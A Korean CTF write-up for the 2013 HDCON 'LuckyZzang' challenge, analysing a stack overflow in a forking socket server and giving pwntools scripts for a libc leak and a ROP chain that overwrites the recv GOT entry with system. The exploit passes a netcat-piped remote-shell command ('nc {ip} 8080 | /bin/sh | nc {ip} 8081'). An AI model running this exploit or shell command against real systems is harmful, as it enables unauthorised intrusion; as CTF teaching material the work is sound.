# [2013_HDCON] \[PWN] LuckyZzang

```
[*] '/root/labs/ctf/2013_hdcon/luckyzzang/ass01'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```



### 취약점 - Stack based Overflow

```c
int __cdecl func(int fd)
{
  unsigned int v1; // eax@1
  int v2; // eax@1
  char buf; // [sp+10h] [bp-408h]@1

  v1 = time(0);
  srand(v1);
  puts("Client has connected successfully :)");
  send(fd, "MSG : ", 6u, 0);
  memset(&buf, 0, 0x400u);
  v2 = rand();
  return recv(fd, &buf, v2 % 100 + 1025, 0);
}
```

스택 오버플로우가 발생합니다.



### 시나리오

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  signed int v4; // [sp+2Ch] [bp-4h]@4

  sockfd = socket(2, 1, 0);
  if ( sockfd == -1 )
  {
    perror("socket");
    exit(1);
  }
  my_addr.sa_family = 2;
  *(_WORD *)&my_addr.sa_data[0] = htons(0x1E61u);
  *(_DWORD *)&my_addr.sa_data[2] = 0;
  *(_DWORD *)&my_addr.sa_data[6] = 0;
  *(_DWORD *)&my_addr.sa_data[10] = 0;
  v4 = 1;
  setsockopt(sockfd, 1, 2, &v4, 4u);
  if ( bind(sockfd, &my_addr, 0x10u) == -1 )
  {
    perror("bind");
    exit(1);
  }
  if ( listen(sockfd, 100) == -1 )
  {
    perror("listen");
    exit(1);
  }
  puts("Way to go!");
  while ( 1 )
  {
    while ( 1 )
    {
      sin_size = 16;
      client_fd = accept(sockfd, &their_addr, &sin_size);
      if ( client_fd != -1 )
        break;
      perror("accept");
    }
    if ( !fork() )
      break;
    close(client_fd);
    while ( waitpid(-1, 0, 1) > 0 )
      ;
  }
  func(client_fd);
  return close(client_fd);
}
```

소켓을 생성한 후 fork를 통해 자식 프로세스를 통해 소켓 통신을 진행합니다. 부모 프로세스는 죽지 않고 계속 살아있기 때문에 통신을 수차례하더라도 프로세스의  got 값은 그대로입니다. got를 한 번 leak 이 주소의 offset을 계속 사용할 수 있습니다.

또, 사용자와 통신하는 fd값은 4입니다.

(원래는 2개의 함수 주소를 leak 하여 libc database를 통해 libc 버전을 특정지어야 하지만 편의상 로컬 libc를 사용하였습니다.)

1. recv 함수를 통해  puts 주소를 leak한다.
2. offset을 계산하여 system 함수의 주소를 구한다.
3. data 영역에 명령어를 적어놓는다.
4. system 함수를 호출하고 data 영역을 인자로 넣어준다.
5. 한번의 system 함수 호출을 통해 shell을 획득하기 위해 'nc {ip} 8080 } | /bin/sh | nc {ip} 8081'을 명령어로 넣는다
6. 8080, 8081 포트를 리스닝한다.
7. 8080 포트엔 shell 명령어를 넣으면 되고, 8081 포트에선 실행 결과가 나타나게 된다.



```python
from pwn import *
import time


ret = 0x80484bb
popret = 0x80484dc
pop2ret = 0x80486a2
pop4ret = 0x80489cc
pop3ret = 0x804878d
recv_plt = 0x080485F0
recv_got = 0x0804A040
send_plt = 0x08048610
puts_plt = 0x08048550
puts_got = 0x0804A018
data = 0x0804A08C
func = 0x080486F3
system = 0xf7e4bda0

payload ="a"*(0x408+4)
payload+=p32(send_plt)	# leak puts
payload+=p32(pop4ret)
payload+=p32(4)
payload+=p32(puts_got)
payload+=p32(4)
payload+=p32(0)

e = ELF('/lib/i386-linux-gnu/libc.so.6')
puts_ = e.symbols['puts']
system_ = e.symbols['system']

s = connect("stealthee.kr", 7777)

print s.recv()
s.send(payload)
puts = u32(s.recv()[:4])
libcbase = puts - puts_
system = libcbase + system_
log.info("libcbase : " + hex(libcbase))
log.info("system : " + hex(system))
s.interactive()
```

leak



```python
from pwn import *
import time

ret = 0x80484bb
popret = 0x80484dc
pop2ret = 0x80486a2
pop4ret = 0x80489cc
pop3ret = 0x804878d
recv_plt = 0x080485F0
recv_got = 0x0804A040
send_plt = 0x08048610
puts_plt = 0x08048550
puts_got = 0x0804A018
data = 0x0804A08C
func = 0x080486F3
system = 0xf7e4bda0

cmd = "nc {ip} 8080 | /bin/sh | nc {ip} 8081\x00"
payload ="a"*(0x408+4)
payload+=p32(recv_plt)  # write cmd in .data
payload+=p32(pop4ret)
payload+=p32(4)
payload+=p32(data)
payload+=p32(len(cmd))
payload+=p32(0)
payload+=p32(recv_plt)  # overwrite recv_got with system
payload+=p32(pop4ret)   
payload+=p32(4)
payload+=p32(recv_got)
payload+=p32(4)
payload+=p32(0)
payload+=p32(recv_plt)  # system call
payload+=p32(0)
payload+=p32(data)

s = connect("stealthee.kr", 7777)
print s.recv()
s.send(payload)
time.sleep(0.5)
s.send(cmd)
time.sleep(0.5)
s.send(p32(system))
s.interactive()
```

exploit